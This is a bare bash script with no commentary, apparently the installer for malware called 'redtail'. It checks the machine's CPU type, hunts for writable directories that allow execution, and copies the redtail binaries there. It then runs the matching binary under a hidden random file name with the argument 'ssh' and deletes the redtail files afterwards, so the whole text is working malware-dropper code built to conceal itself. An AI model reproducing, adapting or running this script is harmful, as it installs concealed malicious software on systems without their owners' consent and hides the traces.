#!/bin/bash

get_random_string() {
  len=$(expr $(od -An -N2 -i /dev/urandom 2>/dev/null | tr -d ' ') % 32 + 4 2>/dev/null)

  if command -v openssl >/dev/null 2>&1; then
    str=$(openssl rand -base64 256 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c "$len")
    if [ -n "$str" ]; then
      echo "$str"
      return 0
    fi
  fi

  if [ -r /dev/urandom ]; then
    str=$(tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c "$len")
    if [ -n "$str" ]; then
      echo "$str"
      return 0
    fi
  fi

  if [ -n "$RANDOM" ]; then
    echo "$RANDOM"
    return 0
  fi

  # If all else fails
  echo "redtail"
  return 1
}

NOARCH=false
ARCH=$(uname -mp)

if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then
  ARCH="x86_64"
elif echo "$ARCH" | grep -q "i[3456]86"; then
  ARCH="i686"
elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
  ARCH="arm8"
elif echo "$ARCH" | grep -q "armv7"; then
  ARCH="arm7"
else
  NOARCH=true
fi

NOEXEC_DIRS=$(cat /proc/mounts | grep 'noexec' | awk '{print $2}')
EXCLUDE=""

for dir in $NOEXEC_DIRS; do
  EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""
done

FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path \"/tmp/*\" -not -path \"/proc/*\" $EXCLUDE 2>/dev/null)
CURR=${PWD}
FILENAME=".$(get_random_string)"

for i in $FOLDERS /tmp /var/tmp /dev/shm; do
  if cd "$i" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || truncate -s 2M .testfile2 >/dev/null 2>&1); then
    rm -rf .testfile .testfile2
    if [ "$CURR" != "$i" ]; then
      cp -r "$CURR"/redtail.* "$i"
    fi
    break
  fi
done

rm -rf .redtail
rm -rf $FILENAME

if [ $NOARCH = true ]; then
  for a in x86_64 i686 arm8 arm7; do
    cat redtail.$a >$FILENAME
    chmod +x $FILENAME
    ./$FILENAME ssh
  done
else
  cat redtail.$ARCH >$FILENAME
  chmod +x $FILENAME
  ./$FILENAME ssh
fi

rm -rf redtail.*
rm -rf "$CURR"/redtail.*
